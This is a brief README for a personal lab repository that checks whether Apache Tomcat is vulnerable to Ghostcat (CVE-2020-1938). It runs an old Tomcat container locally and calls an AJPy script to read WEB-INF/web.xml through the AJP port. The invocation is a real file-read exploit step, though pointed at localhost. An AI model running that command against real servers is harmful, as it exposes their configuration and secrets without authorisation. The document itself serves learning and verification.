# Ghostcat verification (CVE-2020-1938)

## Summary

A new exploit called Ghostcat has been found [CVE-2020-1938], see the articles on [snyk] and [tenable] for details and analysis of the exploit itself.

In my case, I wanted to verify which services are exploitable and if so how does it manifest itself.

## Prerequsites

- docker
- python
- git

## Demonstration

```bash
git clone git@github.com:shaunmclernon/ghostcat-verification.git
cd ghostcat-verification
cd AJPy
docker run -d -p 8080:8080 -p 8009:8009 tomcat:8.5.32
python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
```

If it returns the web.xml then this version of Tomcat is vulnerable to the exploit.

## Disclaimer

I am not a security professional and this repo was built for my learning purposes, it is not intended to be used for malicious purposes.

[CVE-2020-1938]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938
[snyk]: https://snyk.io/blog/ghostcat-breach-affects-all-tomcat-versions/
[tenable]: https://www.tenable.com/blog/cve-2020-1938-ghostcat-apache-tomcat-ajp-file-readinclusion-vulnerability-cnvd-2020-10487